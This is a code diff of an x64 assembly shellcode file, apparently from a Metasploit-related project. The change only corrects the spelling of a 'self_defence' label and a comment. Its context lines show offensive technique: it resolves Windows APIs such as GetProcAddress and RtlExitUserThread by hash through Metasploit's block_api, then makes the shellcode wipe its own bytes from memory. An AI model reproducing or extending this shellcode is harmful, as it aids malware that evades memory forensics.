@@ -2,7 +2,7 @@
 [ORG 0]
  
  
-self_defence:
+self_defense:
 	cld                             ; Clear direction flags
     call start          
 	%include "./blocks/block_api.asm"; Stephen Fewer's hash API from metasploit project
@@ -69,10 +69,10 @@ start:
 	mov r10d,0x7802F749             ; hash("KERNEL32.dll", "GetProcAddress")
 	call rbp	                    ; GetProcAddress(HANDLE,"RtlExitUserThread")
 	mov rbp,rax	                    ; Save the RtlExitUserThread address to RBP
-total_size equ $-self_defence
+total_size equ $-self_defense
 	call $+5                        ; Push the current address to stack
 	pop rax                         ; Pop the current EIP address to RAX
-	mov rcx,total_size              ; Set the total size of the self defence shellcode to RCX
+	mov rcx,total_size              ; Set the total size of the self defense shellcode to RCX
 clean:
 	mov byte [rax],0x00             ; Wipe 1 byte
 	dec rax                         ; Decrease index 1 byte
